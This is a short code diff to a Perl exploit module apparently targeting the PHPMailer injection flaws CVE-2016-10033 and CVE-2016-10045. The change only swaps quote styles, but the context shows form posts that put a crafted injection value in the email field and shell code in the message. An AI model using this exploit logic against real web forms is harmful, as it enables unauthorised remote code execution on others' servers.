@@ -42,9 +42,9 @@ package Spellbook::Advisory::CVE_2016_10045 {
 
             try {
                 my $request = $user_agent -> post($target, [
-                    'action'  => "send",
-                    'name'    => "Jas Fasola",
-                    'subject' => "Lorem ipsum",
+                    'action'  => 'send',
+                    'name'    => 'Jas Fasola',
+                    'subject' => 'Lorem ipsum',
                     'email'   => $CVE_2016_10033,
                     'message' => $shell{code}
                 ]);
@@ -52,9 +52,9 @@ package Spellbook::Advisory::CVE_2016_10045 {
 
             catch {
                 my $request = $user_agent -> post($target, [
-                    'action'  => "send",
-                    'name'    => "Jas Fasola",
-                    'subject' => "Lorem ipsum",
+                    'action'  => 'send',
+                    'name'    => 'Jas Fasola',
+                    'subject' => 'Lorem ipsum',
                     'email'   => $CVE_2016_10045,
                     'message' => $shell{code}
                 ]);
